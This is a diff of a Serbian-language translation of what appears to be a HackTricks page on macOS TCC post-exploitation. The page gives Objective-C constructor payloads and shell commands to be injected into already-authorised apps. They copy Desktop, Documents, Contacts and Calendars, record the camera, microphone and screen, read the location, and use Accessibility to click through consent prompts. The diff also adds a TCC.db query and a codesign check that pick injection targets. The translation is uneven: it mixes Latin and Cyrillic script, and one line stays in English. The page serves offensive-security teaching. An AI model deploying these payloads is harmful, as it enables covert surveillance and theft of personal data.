@@ -3,12 +3,24 @@
 {{#include ../../../../banners/hacktricks-training.md}}
 
 > [!TIP]
-> TCC odluke su vezane za **identitet procesa** koji zahteva resurs. U post-exploitation, uobičajeni cilj je da se **ovi payloads ubace u već odobreni app** (ili da se na drugi način izvrše unutar njegovog bundle / signature konteksta) umesto da se pokrene novi helper koji će izazvati sopstveni prompt.
+> TCC odluke su povezane sa **identitetom procesa** koji zahteva resurs. Tokom post-exploitation faze, uobičajeni cilj je **ubaciti ove payloads u aplikaciju kojoj je pristup već odobren** (ili ih na drugi način izvršiti u kontekstu njenog bundle-a / potpisa), umesto pokretanja novog helper-a koji će pokrenuti sopstveni prompt.
 >
-> Za **Screen Recording**, **Input Monitoring**, i **synthetic input**, moderni macOS takođe izlaže eksplicitne preflight / request API-je kao što su `CGPreflightScreenCaptureAccess`, `CGRequestScreenCaptureAccess`, `CGRequestListenEventAccess`, i `CGRequestPostEventAccess`.
+> Za **Screen Recording**, **Input Monitoring** i **synthetic input**, moderni macOS takođe izlaže eksplicitne preflight / request API-je, kao što su `CGPreflightScreenCaptureAccess`, `CGRequestScreenCaptureAccess`, `CGRequestListenEventAccess` i `CGRequestPostEventAccess`.
 
 > [!WARNING]
-> Ovo je i dalje veoma realistična napadna putanja: nedavna research o krađi dozvola protiv Microsoft macOS apps pokazala je da **slaba library validation / plugin loading** može napadaču da omogući da ponovo iskoristi već dodeljene **camera**, **microphone**, i druge TCC dozvole žrtvinog app-a bez drugog prompta.
+> Ovo je i dalje veoma realan attack path: nedavna istraživanja krađe dozvola protiv Microsoft macOS aplikacija pokazala su da **slaba library validation / plugin loading** može napadaču omogućiti da ponovo iskoristi već odobrene TCC dozvole žrtvine aplikacije za **kameru**, **mikrofon** i druge resurse, bez drugog prompt-a.
+
+## Brzi triage pre korišćenja payload-a
+
+Nedavna istraživanja krađe dozvola i dalje potvrđuju isti workflow: prvo pronađite aplikaciju koja već ima željeni TCC grant, a zatim proverite da li je ona realna injection meta.
+```bash
+sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
+"select service, client from access where auth_value=2 and service in ('kTCCServiceCamera','kTCCServiceMicrophone','kTCCServiceScreenCapture','kTCCServiceAccessibility') order by service, client;"
+
+codesign -d --entitlements :- /Applications/Target.app 2>/dev/null | \
+egrep 'disable-library-validation|allow-dyld-environment-variables'
+```
+Ako cilj takođe učitava plug-ins / frameworks pod kontrolom napadača, ovi payloads postaju mnogo zanimljiviji. Za šire post-exploitation ideje nakon ulaska u već odobren proces, pogledajte [ovu povezanu stranicu](macos-tcc-credential-and-data-theft.md).
 
 ### Desktop
 
@@ -17,7 +29,7 @@
 
 {{#tabs}}
 {{#tab name="ObjetiveC"}}
-Kopiraj `$HOME/Desktop` u `/tmp/desktop`.
+Kopirajte `$HOME/Desktop` u `/tmp/desktop`.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -66,7 +78,7 @@ cp -r "$HOME/Desktop" "/tmp/desktop"
 
 {{#tabs}}
 {{#tab name="ObjetiveC"}}
-Kopiraj `$HOME/Documents` u `/tmp/documents`.
+Kopirajte `$HOME/Documents` u `/tmp/documents`.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -101,7 +113,7 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="Shell"}}
-Kopiraj `$HOME/`Documents u `/tmp/documents`.
+Copy `$HOME/`Documents to `/tmp/documents`.
 ```bash
 cp -r "$HOME/Documents" "/tmp/documents"
 ```
@@ -115,7 +127,7 @@ cp -r "$HOME/Documents" "/tmp/documents"
 
 {{#tabs}}
 {{#tab name="ObjetiveC"}}
-Kopiraj `$HOME/Downloads` u `/tmp/downloads`.
+Kopirajte `$HOME/Downloads` u `/tmp/downloads`.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -199,21 +211,21 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="Shell"}}
-Kopiraj `$HOME/Pictures/Photos Library.photoslibrary` u `/tmp/photos`.
+Kopirajte `$HOME/Pictures/Photos Library.photoslibrary` u `/tmp/photos`.
 ```bash
 cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 ```
 {{#endtab}}
 {{#endtabs}}
 
-### Contacts
+### Kontakti
 
 - **Entitlement**: `com.apple.security.personal-information.addressbook`
 - **TCC**: `kTCCServiceAddressBook`
 
 {{#tabs}}
 {{#tab name="ObjetiveC"}}
-Kopiraj `$HOME/Library/Application Support/AddressBook` u `/tmp/contacts`.
+Kopirajte `$HOME/Library/Application Support/AddressBook` u `/tmp/contacts`.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -248,21 +260,21 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="Shell"}}
-Kopiraj `$HOME/Library/Application Support/AddressBook` u `/tmp/contacts`.
+Kopirajte `$HOME/Library/Application Support/AddressBook` u `/tmp/contacts`.
 ```bash
 cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
 ```
 {{#endtab}}
 {{#endtabs}}
 
-### Calendar
+### Kalendar
 
 - **Entitlement**: `com.apple.security.personal-information.calendars`
 - **TCC**: `kTCCServiceCalendar`
 
 {{#tabs}}
 {{#tab name="ObjectiveC"}}
-Kopiraj `$HOME/Library/Calendars` u `/tmp/calendars`.
+Kopirajte `$HOME/Library/Calendars` u `/tmp/calendars`.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -297,7 +309,7 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="Shell"}}
-Kopiraj `$HOME/Library/Calendars` u `/tmp/calendars`.
+Kopirajte `$HOME/Library/Calendars` u `/tmp/calendars`.
 ```bash
 cp -r "$HOME/Library/Calendars" "/tmp/calendars"
 ```
@@ -311,7 +323,7 @@ cp -r "$HOME/Library/Calendars" "/tmp/calendars"
 
 {{#tabs}}
 {{#tab name="ObjetiveC - Record"}}
-Snimi video od 3s i sačuvaj ga u **`/tmp/recording.mov`**
+Snimite video u trajanju od 3 s i sačuvajte ga u **`/tmp/recording.mov`**
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -390,7 +402,7 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="ObjectiveC - Check"}}
-Proveri da li program ima pristup kameri.
+Proverite da li program ima pristup kameri.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -422,22 +434,41 @@ fclose(stderr); // Close the file stream
 ```
 {{#endtab}}
 
+{{#tab name="ObjectiveC - Prompt"}}
+Pokreni zahtev za pristup kameri ako je trenutni proces i dalje `NotDetermined`.
+```objectivec
+#import <Foundation/Foundation.h>
+#import <AVFoundation/AVFoundation.h>
+#import <dispatch/dispatch.h>
+__attribute__((constructor))
+static void camprompt(int argc, const char **argv) {
+if ([AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo] != AVAuthorizationStatusNotDetermined) return;
+dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+[AVCaptureDevice requestAccessForMediaType:AVMediaTypeVideo completionHandler:^(BOOL granted) {
+NSLog(@"Camera prompt result: %@", granted ? @"granted" : @"denied");
+dispatch_semaphore_signal(sem);
+}];
+dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
+}
+```
+{{#endtab}}
+
 {{#tab name="Shell"}}
-Napravi fotografiju kamerom
+Snimite fotografiju kamerom
 ```bash
 ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 ```
 {{#endtab}}
 {{#endtabs}}
 
-### Microphone
+### Mikrofon
 
 - **Entitlement**: **com.apple.security.device.audio-input**
 - **TCC**: `kTCCServiceMicrophone`
 
 {{#tabs}}
 {{#tab name="ObjetiveC - Record"}}
-Snimi 5s audio i sačuvaj ga u `/tmp/recording.m4a`
+Snima 5 sekundi audio zapisa i čuva ga u `/tmp/recording.m4a`
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -537,7 +568,7 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="ObjectiveC - Check"}}
-Proveri da li aplikacija ima pristup mikrofonu.
+Proverite da li aplikacija ima pristup mikrofonu.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -567,8 +598,27 @@ static void telegram(int argc, const char **argv) {
 ```
 {{#endtab}}
 
+{{#tab name="ObjectiveC - Prompt"}}
+Pokrenite upit za mikrofon ako je trenutni proces i dalje `NotDetermined`.
+```objectivec
+#import <Foundation/Foundation.h>
+#import <AVFoundation/AVFoundation.h>
+#import <dispatch/dispatch.h>
+__attribute__((constructor))
+static void micprompt(int argc, const char **argv) {
+if ([AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio] != AVAuthorizationStatusNotDetermined) return;
+dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+[AVCaptureDevice requestAccessForMediaType:AVMediaTypeAudio completionHandler:^(BOOL granted) {
+NSLog(@"Microphone prompt result: %@", granted ? @"granted" : @"denied");
+dispatch_semaphore_signal(sem);
+}];
+dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
+}
+```
+{{#endtab}}
+
 {{#tab name="Shell"}}
-Snimite 5 sekundi zvuka i sačuvajte ga u `/tmp/recording.wav`
+Snimite audio u trajanju od 5 s i sačuvajte ga u `/tmp/recording.wav`
 ```bash
 # Check the microphones
 ffmpeg -f avfoundation -list_devices true -i ""
@@ -581,14 +631,14 @@ ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
 ### Lokacija
 
 > [!TIP]
-> Da bi aplikacija dobila lokaciju, **Location Services** (iz Privacy & Security) **mora biti omogućen,** u suprotnom neće moći da joj pristupi.
+> Da bi aplikacija dobila lokaciju, **Location Services** (u odeljku Privacy & Security) **mora biti omogućen,** u suprotnom neće moći da joj pristupi.
 
 - **Entitlement**: `com.apple.security.personal-information.location`
-- **TCC**: Granted in `/var/db/locationd/clients.plist`
+- **TCC**: Odobreno u `/var/db/locationd/clients.plist`
 
 {{#tabs}}
 {{#tab name="ObjectiveC"}}
-Upiši lokaciju u `/tmp/logs.txt`
+Upišite lokaciju u `/tmp/logs.txt`
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -638,7 +688,7 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 {{#endtab}}
 
 {{#tab name="Shell"}}
-Uzmite trenutnu lokaciju iz shell-a.
+Preuzmite trenutnu lokaciju iz shell-a.
 ```bash
 # Fast option: use a dedicated CoreLocation CLI helper
 brew install --cask corelocationcli
@@ -648,19 +698,19 @@ CoreLocationCLI --json
 CoreLocationCLI --watch --format '%latitude %longitude %speed %time'
 ```
 > [!TIP]
-> Ovo i dalje zavisi od toga da su **Location Services** omogućene i da alat / terminal dobije TCC odobrenje. `CoreLocationCLI` takođe zavisi od Wi-Fi-assisted positioning na većini Mac računara, pa isključen Wi-Fi često završava sa `kCLErrorDomain error 0`.
+> Ovo i dalje zavisi od toga da li su **Location Services** omogućene i da li su alat / terminal dobili TCC odobrenje. `CoreLocationCLI` se takođe na većini Mac računara oslanja na pozicioniranje potpomognuto Wi-Fi mrežom, pa onemogućen Wi-Fi često dovodi do `kCLErrorDomain error 0`.
 
 {{#endtab}}
 {{#endtabs}}
 
-### Screen Recording
+### Snimanje ekrana
 
 - **Entitlement**: None
 - **TCC**: `kTCCServiceScreenCapture`
 
 {{#tabs}}
 {{#tab name="ObjectiveC"}}
-Snimi glavni ekran 5s u `/tmp/screen.mov`
+Snimi glavni ekran tokom 5s u `/tmp/screen.mov`
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -718,7 +768,7 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 {{#endtab}}
 
 {{#tab name="ObjectiveC - Check / Prompt"}}
-Proveri da li trenutni proces može da snima ekran i pokrene TCC prompt ako je potrebno.
+Proverite da li trenutni proces može da snima ekran i pokrenite TCC prompt ako je potrebno.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <CoreGraphics/CoreGraphics.h>
@@ -739,7 +789,7 @@ fclose(stderr);
 {{#endtab}}
 
 {{#tab name="Shell"}}
-Snimite glavni ekran tokom 5 s
+Snimaj glavni ekran 5 s.
 ```bash
 screencapture -V 5 /tmp/screen.mov
 ```
@@ -747,14 +797,14 @@ screencapture -V 5 /tmp/screen.mov
 {{#endtabs}}
 
 > [!TIP]
-> Na **macOS 12.3+**, `ScreenCaptureKit` je obično bolji post-exploitation primitive od `AVCaptureScreenInput`: može da radi high-performance streaming, single-frame grabs sa `SCScreenshotManager`, i streamuje **system audio**. Ako takođe želiš **microphone** audio, i dalje ti treba `kTCCServiceMicrophone`. Za više desktop-session abuse primitive, vidi [ovu povezanu stranicu](../macos-input-monitoring-screen-capture-accessibility.md).
+> Na **macOS 12.3+**, `ScreenCaptureKit` je obično bolji post-exploitation primitive od `AVCaptureScreenInput`: može da obavlja streaming visokih performansi, preuzimanje pojedinačnih frejmova pomoću `SCScreenshotManager` i streaming **system audio**. Nedavna ažuriranja za `ScreenCaptureKit` takođe su dodala `captureMicrophone` / `microphoneCaptureDeviceID` u `SCStreamConfiguration`, kao i `SCRecordingOutput` za direktno snimanje u fajl, tako da jedan hijacked screen-capture client može direktno da sačuva screen + system audio i doda mic audio kada proces poseduje i `kTCCServiceMicrophone`. Za više primitive za zloupotrebu desktop-session, pogledajte [this related page](../macos-input-monitoring-screen-capture-accessibility.md).
 
 ### Accessibility
 
 - **Entitlement**: None
 - **TCC**: `kTCCServiceAccessibility`
 
-Iskoristi TCC privilege da prihvatiš kontrolu nad Finder-om pritiskom na enter i tako zaobiđeš TCC
+Iskoristite TCC privilege da prihvatite kontrolu nad Finder-om pritiskom na Enter i na taj način zaobiđete TCC.
 
 {{#tabs}}
 {{#tab name="Accept TCC"}}
@@ -806,6 +856,20 @@ usleep(100000); // 0.1 seconds
 }
 }
 return 0;
+}
+```
+{{#endtab}}
+
+{{#tab name="Check / Prompt"}}
+Proverite da li trenutni proces već ima odobrenje za Accessibility i zatražite od macOS-a da prikaže UI za davanje saglasnosti ako ga nema.
+```objectivec
+#import <Foundation/Foundation.h>
+#import <ApplicationServices/ApplicationServices.h>
+__attribute__((constructor))
+static void axprompt(int argc, const char **argv) {
+NSDictionary *opts = @{(__bridge id)kAXTrustedCheckOptionPrompt: @YES};
+BOOL trusted = AXIsProcessTrustedWithOptions((__bridge CFDictionaryRef)opts);
+NSLog(@"Accessibility access: %@", trusted ? @"granted" : @"pending/denied");
 }
 ```
 {{#endtab}}
@@ -918,17 +982,19 @@ return 0;
 {{#endtab}}
 {{#endtabs}}
 
-> [!CAUTION] > **Pristupnost je veoma moćna dozvola**, možeš je zloupotrebiti i na druge načine, na primer možeš izvesti **keystrokes attack** samo pomoću nje, bez potrebe da pozoveš System Events.
+> [!CAUTION] > **Accessibility је веома моћна дозвола**, можете је злоупотребити и на друге начине, на пример, можете извршити **keystrokes attack** само помоћу ње, без потребе да позивате System Events.
 
 > [!TIP]
-> Novije macOS verzije takođe dele zloupotrebu desktop-session-a između **Input Monitoring** (`kTCCServiceListenEvent`) i **synthetic input** (`kTCCServicePostEvent`). Ako ti treba keylogging, screen grabs ili raw event injection umesto AXUIElement automatizacije, pogledaj [macOS Input Monitoring, Screen Capture & Accessibility Abuse](../macos-input-monitoring-screen-capture-accessibility.md).
+> Новије верзије macOS-а такође раздвајају злоупотребу desktop сесије на **Input Monitoring** (`kTCCServiceListenEvent`) и **synthetic input** (`kTCCServicePostEvent`). Ако су вам потребни keylogging, screen grabs или raw event injection уместо AXUIElement automation, погледајте [macOS Input Monitoring, Screen Capture & Accessibility Abuse](../macos-input-monitoring-screen-capture-accessibility.md).
 
 
 
-## References
+## Референце
 
-- [Cisco Talos - How multiple vulnerabilities in Microsoft apps for macOS pave the way to stealing permissions](https://blog.talosintelligence.com/how-multiple-vulnerabilities-in-microsoft-apps-for-macos-pave-the-way-to-stealing-permissions/)
+- [Cisco Talos - Како више рањивости у Microsoft апликацијама за macOS отвара пут крађи дозвола](https://blog.talosintelligence.com/how-multiple-vulnerabilities-in-microsoft-apps-for-macos-pave-the-way-to-stealing-permissions/)
 - [CoreLocationCLI](https://github.com/fulldecent/corelocationcli)
+- [Apple Developer - Захтевање ауторизације за media capture на macOS-у](https://developer.apple.com/documentation/bundleresources/requesting-authorization-for-media-capture-on-macos?language=objc)
+- [Apple Developer - Снимање HDR садржаја помоћу ScreenCaptureKit-а (WWDC24)](https://developer.apple.com/videos/play/wwdc2024/10088/)
 
 
 {{#include ../../../../banners/hacktricks-training.md}}
